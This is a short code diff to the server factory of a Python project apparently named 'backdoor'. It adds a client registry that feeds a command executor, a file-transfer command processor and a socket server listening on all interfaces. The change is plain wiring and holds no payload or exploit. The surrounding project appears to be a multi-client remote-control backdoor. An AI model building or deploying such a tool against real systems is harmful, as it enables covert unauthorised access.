@@ -10,6 +10,7 @@ from backdoor.messages.messenger import SocketMessenger
 from backdoor.messages.protocol import SocketProtocol
 from backdoor.serialization.jsonserializer import JsonSerializer
 from backdoor.server.core import Server
+from backdoor.server.registry import ClientRegistry
 
 
 DEFAULT_HOST = "0.0.0.0"
@@ -29,11 +30,12 @@ def create_server(host: str, port: int) -> Server:
     converter = InputToCommandConverter()
     file_writer = FileWriter()
     file_reader = FileReader()
+    registry = ClientRegistry()
 
     messenger = SocketMessenger(protocol, serializer)
     exchanger = ServerExchangeMapper(messenger)
-    executor = LocalCommandExecutor()
-    processor = CommandProcessor(file_writer, file_reader)
+    executor = LocalCommandExecutor(registry)
+    processor = CommandProcessor(file_writer, file_reader, registry)
 
     return Server(
         messenger,
@@ -41,6 +43,7 @@ def create_server(host: str, port: int) -> Server:
         converter,
         processor,
         executor,
+        registry,
         host=host,
         port=port,
     )
